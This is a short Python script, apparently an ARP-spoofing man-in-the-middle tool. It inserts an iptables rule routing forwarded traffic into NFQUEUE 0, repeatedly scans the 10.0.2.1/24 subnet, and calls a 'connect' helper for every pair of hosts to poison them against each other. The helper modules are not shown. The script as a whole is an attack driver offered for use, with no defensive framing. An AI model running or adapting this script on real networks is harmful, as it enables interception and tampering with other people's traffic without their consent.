#!/usr/bin/env python

from net_scan import *
import subprocess
from online import *
import time


def main():
    try:
        subprocess.call(["sudo", "iptables", "-I", "FORWARD", "-j", "NFQUEUE", "--queue-num", "0"])
        while True:
            result_list = scan("10.0.2.1/24")
            length = len(result_list)
            for i in range(length-1):
                count, count1 = i, 0
                while count <= (length-1):
                    connect(result_list[i]["ip"], result_list[(count+1) % length]["ip"], result_list[i]["mac"])
                    connect(result_list[(count+1) % length]["ip"], result_list[i]["ip"], result_list[(count+1) % length]["mac"])
                    count += 1
                    count1 += 1
            time.sleep(2)
    except KeyboardInterrupt:
        subprocess.call(["sudo", "iptables", "-F"])


if __name__ == '__main__':
    main()

